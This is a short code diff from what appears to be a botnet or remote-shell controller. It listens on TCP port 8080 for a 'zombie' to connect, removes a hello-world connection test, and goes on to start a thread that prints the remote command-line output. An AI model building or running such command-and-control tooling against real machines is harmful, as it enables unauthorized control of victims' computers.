@@ -39,12 +39,6 @@ def main():
     # wait for a zombie to connect
     cmdSock = utils.receiveTCP(8080)
 
-    # connection test
-    print(cmdSock.recv(4096))
-    cmdSock.sendall("Hello World!".encode('UTF-8') + b'\0')
-    cmdSock.close()
-    return
-
     # start a thread to print the command line output
     cmdThread = cmdOutputThread(cmdSock)
     cmdThread.start()
